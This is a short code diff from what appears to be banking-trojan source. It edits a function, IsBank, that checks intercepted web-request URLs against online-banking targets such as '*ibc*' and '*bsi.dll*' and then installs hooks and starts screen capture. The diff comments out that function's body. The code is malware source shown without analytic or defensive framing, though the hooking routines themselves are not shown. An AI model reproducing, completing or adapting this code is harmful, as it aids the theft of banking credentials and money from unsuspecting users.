@@ -12,6 +12,8 @@ bool IbankHooksMain()
 void IsBank( HINTERNET hRequest )
 {
 
+/*	
+
 	DWORD dwUrlSize = 4096;
 	char *Url		= (char*)MemAlloc( dwUrlSize );
 	
@@ -25,27 +27,28 @@ void IsBank( HINTERNET hRequest )
 			{
 				//HookCyberplat();
 				//InitScreenLib();
-			}
+			} 
+
 			else if ( CompareUrl( "*ibc*", Url ) )
 			{
-				InistHooks();
+			//	InistHooks();
 				InitScreenLib();
-			}
+			} 
 
-		/*	#ifdef BSSH
+			#ifdef BSSH
 				else if ( CompareUrl( "*bsi.dll*", Url ) )
 				{
 					BSSHooks();
 					InitScreenLib();
 				}
-			#endif */
+			#endif 
 
 		}
 
 		MemFree( Url );
 	}
+*/
 
-	return;
 }
 
 bool HookCyberplatPCMain()
